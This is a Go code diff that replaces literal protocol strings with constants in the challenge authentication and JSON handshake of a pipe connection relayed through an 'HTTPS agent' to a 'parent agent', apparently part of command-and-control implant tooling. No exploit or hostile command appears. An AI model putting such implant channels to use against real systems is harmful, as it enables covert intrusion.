@@ -33,8 +33,8 @@ func performAuth(conn *PipeConnection) error {
 		return fmt.Errorf(ErrCtx(E10, err.Error()))
 	}
 
-	// Verify response format: should be "AUTH:" + challenge
-	expectedPrefix := []byte("AUTH:")
+	// Verify response format: should be AUTH prefix + challenge
+	expectedPrefix := []byte(protoAuthPrefix)
 	if len(response) != len(expectedPrefix)+len(challenge) {
 		return fmt.Errorf(Err(E2))
 	}
@@ -52,7 +52,7 @@ func performAuth(conn *PipeConnection) error {
 	}
 
 	// Send confirmation
-	if err := conn.WriteMessage([]byte("OK")); err != nil {
+	if err := conn.WriteMessage([]byte(protoAuthOk)); err != nil {
 		return fmt.Errorf(ErrCtx(E11, err.Error()))
 	}
 
@@ -78,8 +78,8 @@ func performHandshake(conn *PipeConnection, config map[string]string) error {
 
 	// Create handshake message to send through the HTTPS agent
 	handshakeMsg := map[string]string{
-		"type":    "handshake",
-		"payload": encryptedPayload,
+		protoKeyType:    protoTypeHandshake,
+		protoKeyPayload: encryptedPayload,
 	}
 
 	msgJSON, err := json.Marshal(handshakeMsg)
@@ -107,12 +107,10 @@ func performHandshake(conn *PipeConnection, config map[string]string) error {
 			}
 
 			// Check if this is a ping message - if so, respond with pong and continue waiting
-			var msgCheck struct {
-				Type string `json:"type"`
-			}
+			var msgCheck map[string]interface{}
 			if err := json.Unmarshal(resp, &msgCheck); err == nil {
-				if msgCheck.Type == "ping" {
-					pongMsg := map[string]string{"type": "pong"}
+				if msgType, _ := msgCheck[protoKeyType].(string); msgType == protoTypePing {
+					pongMsg := map[string]string{protoKeyType: protoTypePong}
 					pongJSON, _ := json.Marshal(pongMsg)
 					conn.WriteMessage(pongJSON)
 					continue // Keep waiting for handshake_response
@@ -133,20 +131,19 @@ func performHandshake(conn *PipeConnection, config map[string]string) error {
 	case response := <-responseChan:
 		// Parse the response
 		// NOTE: Parent agent sends "payload" (not "pl") for the payload field
-		var respEnvelope struct {
-			Type    string `json:"type"`
-			Payload string `json:"payload"`
-		}
+		var respEnvelope map[string]interface{}
 		if err := json.Unmarshal(response, &respEnvelope); err != nil {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
 
-		if respEnvelope.Type != "handshake_response" {
+		respType, _ := respEnvelope[protoKeyType].(string)
+		if respType != protoTypeHsResp {
 			return fmt.Errorf(Err(E2))
 		}
 
 		// Decode and parse the signed response
-		respBytes, err := base64.StdEncoding.DecodeString(respEnvelope.Payload)
+		respPayload, _ := respEnvelope[protoKeyPayload].(string)
+		respBytes, err := base64.StdEncoding.DecodeString(respPayload)
 		if err != nil {
 			return fmt.Errorf(ErrCtx(E18, err.Error()))
 		}
